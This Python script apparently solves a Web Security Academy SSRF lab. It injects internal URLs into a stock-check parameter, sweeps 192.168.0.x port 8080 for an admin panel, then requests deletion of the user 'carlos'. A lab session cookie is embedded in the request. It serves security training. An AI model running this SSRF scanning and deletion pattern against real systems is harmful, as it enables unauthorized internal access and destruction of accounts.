# Server-side request forgery (SSRF) attacks 8 of 23
# Lab: Basic SSRF against another back-end system

import asyncio
from pprint import pprint
from common.base import run_payloads

RAW_REQUEST_POST = """
POST /product/stock HTTP/2
Host: 0ad100cd039c32028118a7c100a40000.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0ad100cd039c32028118a7c100a40000.web-security-academy.net/product?productId=3
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: https://0ad100cd039c32028118a7c100a40000.web-security-academy.net
Connection: keep-alive
Cookie: session=QrDo9IvIEPT7gSR75xqxAsBkj2wGraVv
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Pragma: no-cache
Cache-Control: no-cache
TE: trailers

stockApi=@@@PAYLOAD@@@
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True)
    return result

async def print_net_result(raw_req, print_response_body=False):
    result = await one_call(raw_req)
    if result['status_code'] == 200:
        secs = result['total_seconds']
        print(f" CALL OK, {secs:.2f} secs")
        if print_response_body: pprint(result['full_text'])
        return True, result['full_text']
    else:
        print(" CALL FAILED")
        if print_response_body: pprint(result['full_text'])
        return False, result['full_text']

def xmlencode (text: str) -> str:
    return "".join(f"&#x{ord(c):X};" for c in text)

async def main():

    # Original post
    raw_req_0 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D2")
    print('PLAIN POST:', end='')
    await print_net_result(raw_req_0, True)

    for ip in range(105, 256):
        raw_req_1 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", f"http%3A%2F%2F192.168.0.{ip}%3A8080%2Fadmin")
        print(f'PLAIN POST {ip}:', end='')
        success, response = await print_net_result(raw_req_1, False)
        if success:
            print(f"Found open port on 192.168.0.{ip}")
            print(f"Response: {response}")
            break

    # You can find the open port by scanning the internal network using SSRF. The above code iterates through the IP range.
    # When you find the open port, you receive a response with the useful link for carlos deletion, for example http://192.168.0.105:8080/admin/delete?username=carlos

    raw_req_2 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", f"%2Fadmin%2Fdelete?username%3Dcarlos")
    print(f'Delete carlos:', end='')
    await print_net_result(raw_req_2, False)

if __name__ == "__main__":
    asyncio.run(main())